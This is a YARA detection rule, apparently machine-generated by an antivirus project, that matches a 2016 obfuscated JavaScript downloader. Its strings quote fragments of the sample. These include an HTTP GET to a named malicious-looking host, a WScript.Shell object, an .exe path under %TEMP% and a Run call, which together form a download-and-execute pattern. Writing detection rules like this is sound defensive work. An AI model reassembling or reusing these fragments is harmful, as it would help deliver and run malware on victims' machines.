rule sig_20160330_ecca84334778e7f82b52446f14e35004 {
  meta:
    description = "datamaliciousorder - file 20160330_ecca84334778e7f82b52446f14e35004.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a1818c576749426d645efbdc4d977042f2e9098432d11c821e54854897d1b53a"

  strings:
    $s1  = "_YF[_Q](\"GET\", \"http://assura-courtage.org/j2osla\", false);" fullword ascii
    $s2  = "function _G(_N, _O0){_MU = _MU * 1; return _N - _O0;};" fullword ascii
    $s3  = "var _V = function _SD() {return WScript[_Q0](\"WScript\"+\".Shell\");}(), _VM = 11;" fullword ascii
    $s4  = "if (_YF[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _MW() {return _V[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"X6Djm0maSXD0uo.ex\" + \"e\";};" fullword ascii
    $s6  = "function _J(){return _E + \"\";};" fullword ascii
    $s7  = "function _HH() {return ((_B == true) && (_B == _I0)) ? 1 : _MU;};" fullword ascii
    $s8  = "function _C(_SQ){_V[\"Run\"](_SQ, _MU, _MU);};" fullword ascii
    $s9  = " while (_A0){" fullword ascii
    $s10 = "function _TW()" fullword ascii
    $s11 = "var _LN = new this[\"Date\"]();" fullword ascii
    $s12 = "function _GD(_AR) {var _L = (1, 2, 3, 4, 5, _AR); return _L;};" fullword ascii
    $s13 = "return _G(_T, _CL);" fullword ascii
    $s14 = "function _DW(){return 22;};" fullword ascii
    $s15 = "function _CY(){return _Q0;};" fullword ascii
    $s16 = "var _H = false;" fullword ascii
    $s17 = "_I0 = true; " fullword ascii
    $s18 = "var _I0 = false;" fullword ascii
    $s19 = "var _B = false;" fullword ascii
    $s20 = "_B = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}